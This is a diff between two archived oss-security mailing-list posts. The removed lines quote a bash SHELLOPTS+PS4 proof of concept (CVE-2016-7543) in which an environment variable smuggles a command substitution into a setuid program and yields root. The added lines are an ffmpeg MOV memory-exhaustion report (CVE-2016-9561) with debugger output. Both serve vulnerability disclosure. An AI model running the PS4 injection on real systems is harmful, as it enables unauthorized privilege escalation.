@@ -1,33 +1,71 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/27/2
-Message-ID: <mpro.oe4vxq069usvx05jg.taviso@cmpxchg8b.com>
-Date: Mon, 26 Sep 2016 16:01:03 -0700
-From: Tavis Ormandy <taviso@...xchg8b.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2016-7543 -- bash SHELLOPTS+PS4
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/08/1
+Message-ID: <A962A2D04FAB5C4499FEFD15B642FA0A32B53451@EX02.corp.qihoo.net>
+Date: Thu, 8 Dec 2016 02:33:57 +0000
+From: 连一汉 <lianyihan@....cn>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: [CVE-2016-9561] ffmpeg crashes on decoding MOV file 
 Content-Type: text/plain; charset=utf-8
 
-up201407890@...nos.dcc.fc.up.pt wrote:
 
-> The recent bash 4.4 patched an old attack vector regarding specially
-> crafted SHELLOPTS+PS4 environment variables against bogus setuid binaries
-> using system()/popen().
-> 
-> https://lists.gnu.org/archive/html/bug-bash/2016-09/msg00018.html
-> 
-> "nn. Shells running as root no longer inherit PS4 from the environment,
-> closing a security hole involving PS4 expansion performing command
-> substitution."
-> 
-> # gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }' #
-> chmod 4755 ./test # ls -l ./test -rwsr-xr-x. 1 root root 8549 Sep 10 18:06
-> ./test # exit $ env -i SHELLOPTS=xtrace PS4='$(id)' ./test uid=0(root) Sat
-> Sep 10 18:06:36 WET 2016
-> 
-> Sorry Tavis :P
-> 
+Hi , I’m Lian Yihan ,a security researcher in Qihoo 360 Gear Team.
 
-Hah, nice work :-)
+I found a vulnerability in ffmpeg <= 3.2. When ffmpeg decodes a small craft MOV file which is just a few megabits, it will allocate a huge memory(about a few gigabits) and then be killed by OS .
 
-Tavis.
+========================= target version ==========================
 
+Ffmpeg 3.2
+
+========================= target command =========================
+
+Ffmpeg -i input.mov -y 1.ts
+
+============================= key information ==========================
+
+0x00000000007ae7b6 in avformat_find_stream_info (ic=0x2173290, options=0x7ffff7f74010) at libavformat/utils.c:3377
+3377            avctx = st->internal->avctx;
+
+(gdb) p ic->nb_streams
+$3 = 26418
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Breakpoint 3, che_configure (ac=0x19ff1810, che_pos=AAC_CHANNEL_FRONT, type=1, id=0, channels=0x7fffffffd458) at libavcodec/aacdec_template.c:135
+135                 if (!(ac->che[type][id] = av_mallocz(sizeof(ChannelElement))))									// malloc a big memory on every loop.
+(gdb) p sizeof(ChannelElement)
+$4 = 547744
+
+The total memory allocated is about 26418*547744 at last.
+
+============================ my test info =========================== ffmpeg version 3.2 Copyright (c) 2000-2016 the FFmpeg developers
+  built with clang version 3.8.0 (tags/RELEASE_380/final)
+  configuration: --cc=afl-clang-fast --enable-debug=3 --disable-asm --disable-stripping --disable-optimizations --disable-shared
+  libavutil      55. 34.100 / 55. 34.100
+  libavcodec     57. 64.100 / 57. 64.100
+  libavformat    57. 56.100 / 57. 56.100
+  libavdevice    57.  1.100 / 57.  1.100
+  libavfilter     6. 65.100 /  6. 65.100
+  libswscale      4.  2.100 /  4.  2.100
+  libswresample   2.  3.100 /  2.  3.100
+[mov,mp4,m4a,3gp,3g2,mj2 @ 0x2a582b0] overread end of atom 'tkhd' by 32 bytes
+[mov,mp4,m4a,3gp,3g2,mj2 @ 0x2a582b0] stream 1, timescale not set Killed
+
+-----邮件原件-----
+发件人: cve-request@...re.org [mailto:cve-request@...re.org] 
+发送时间: 2016年11月23日 8:40
+收件人: 连一汉
+抄送: cve-request@...re.org
+主题: Re: [scr264871] Huge memory allocated
+
+> [VulnerabilityType Other]
+> Huge memory allocated , result in DoS of ffmpeg.
+> 
+> ------------------------------------------
+> 
+> [Affected Product Code Base]
+> ffmpeg - 3.2
+
+Use CVE-2016-9561.
+
+--
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA [ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
